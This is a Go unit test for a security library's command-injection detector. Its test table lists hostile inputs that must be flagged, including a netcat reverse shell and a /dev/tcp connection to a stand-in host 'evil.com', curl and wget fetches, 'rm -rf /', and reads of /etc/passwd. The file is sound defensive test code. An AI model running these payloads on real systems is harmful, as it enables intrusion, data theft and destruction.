// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package injection

import (
	"testing"

	"github.com/erikwang2013/security-go"
)

func TestCommand(t *testing.T) {
	d := &Command{}
	if got := d.Name(); got != "command_injection" {
		t.Fatalf("Name() = %q, want %q", got, "command_injection")
	}
	tests := []struct {
		input  string
		should bool
	}{
		// payloads
		{"`cat /etc/passwd`", true},
		{"$(whoami)", true},
		{"| cat /etc/passwd", true},
		{"| CAT /etc/passwd", true},
		{"| bash -i", true},
		{"| nc -e /bin/sh evil.com 4444", true},
		{"| curl evil.com", true},
		{"| uname -a", true},
		{"system('rm -rf /')", true},
		{"shell_exec('ls')", true},
		{"passthru('id')", true},
		{"popen('id','r')", true},
		{"proc_open('x', $pipes)", true},
		{"pcntl_exec('/bin/sh')", true},
		{"&& wget evil.com", true},
		{"&& WHOAMI", true},
		{"; ls -la", true},
		{"; LS -la", true},
		{"|| nc -e /bin/sh", true},
		{"ping -c 4 127.0.0.1", true},
		{"nslookup evil.com", true},
		{"/dev/tcp/evil.com/8080", true},
		{">/dev/null 2>&1", true},
		{"%0a%0a", true},
		// benign / boundary
		{"normal text", false},
		{"hello world", false},
		{"a | b", false},
		{"echo 1 > /dev/null", false},
		{"hello $USER", false},
		{"", false},
	}
	var meta *security.Result
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
		if tc.should && meta == nil {
			meta = r
		}
	}
	if meta == nil {
		t.Fatal("no detected case to verify metadata")
	}
	if meta.Severity != security.SeverityCritical {
		t.Errorf("detected severity = %v, want SeverityCritical", meta.Severity)
	}
	if meta.Message == "" {
		t.Error("detected Message must not be empty")
	}
	if meta.Details["pattern"] == nil {
		t.Error("detected Details must contain pattern")
	}
	if r := d.Detect("hello"); r.Name != d.Name() || r.Detected {
		t.Errorf("undetected result: Name=%q Detected=%v, want %q/false", r.Name, r.Detected, d.Name())
	}
}
